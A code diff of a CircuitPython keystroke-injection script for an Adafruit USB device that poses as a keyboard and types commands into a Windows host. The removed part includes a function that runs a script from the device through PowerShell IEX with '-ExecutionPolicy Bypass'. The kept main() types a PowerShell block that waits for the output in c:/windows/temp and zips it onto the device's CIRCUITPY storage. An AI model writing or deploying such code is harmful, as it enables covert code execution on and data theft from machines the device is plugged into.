@@ -158,52 +158,6 @@ def toggle_storage():
     except:
         blink_status(COLORS["error"], 5)
 
-# Run commands while toggling storage mode
-def run_with_storage(kbd, layout, callback, *args):
-    blink_status(next(blink_gen)[0], 3)
-
-    rep = 5
-    while rep > 0:
-        try:
-            storage.remount("/", readonly=False)  
-            time.sleep(5)
-            callback(*args)
-            rep = 0
-            break 
-
-        except Exception:
-            rep -= 1
-            blink_status(COLORS["error"], 3)
-
-# Find the Adafruit Device Drive Letter
-def find_storage_drive():
-    # TODO
-    return "F:" 
-
-# Run a script in Powershell (from Adafruit Device)
-def run_script_from_storage(kbd, layout, script_name="demo.ps1"):
-    blink_status(next(blink_gen)[0], 4)
-    
-    try:
-        storage_drive = find_storage_drive()
-        if not storage_drive:
-            blink_status(COLORS["error"], 5)
-            return 
-
-    except:
-        blink_status(COLORS["error"], 6)
-        return 
-
-    script_path = f"{storage_drive}\\sd\\{script_name}"
-    command = f""" 
-    $env:v=(Get-Content -ErrorAction SilentlyContinue -Force -Path {script_path}) -join "`n"; powershell -ExecutionPolicy Bypass -noprofile -Command "'$env:v' | IEX | Out-File c:/windows/temp/sout.txt " ; 
-    """
-
-    try:
-        run_with_storage(kbd, layout, run_ps, kbd, layout, command)
-
-    except Exception:
-        blink_status(COLORS["error"], 7)
 
 # Init Status
 blink_status(COLORS["green"], 3)
@@ -215,17 +169,14 @@ layout = KeyboardLayout(kbd)
 # Demo / Tests
 def demos():
     run_box(kbd, layout, "echo 123")
-    run_with_storage(kbd, layout, run_box, "echo 123")
 
     run_ps(kbd, layout, "Get-Process")
-    run_with_storage(kbd, layout, run_ps, "Get-Process")
 
     run_cmd(kbd, layout, "dir")
-    run_with_storage(kbd, layout, run_cmd, "dir")
 
 
 def main():  
-    command2 = """
+    command = """
 $o="C:/windows/temp/sout.txt";
 $dl = ((Get-Volume | Where-Object { $_.FileSystemLabel -eq "CIRCUITPY" }).DriveLetter + ":") -replace "^:$", "F:"
 if (Test-Path $o) { del $o };
@@ -236,7 +187,8 @@ while (-not (Test-Path $o)) { Start-Sleep -Milliseconds 500 };
 Compress-Archive -Path $o -DestinationPath "$dl/sd/$(Split-Path -Leaf $o).zip";
 exit;
 """
-
-    run_ps(kbd, layout, command2)
+    time.sleep(7)
+    run_ps(kbd, layout, command)
 
 main() 
+
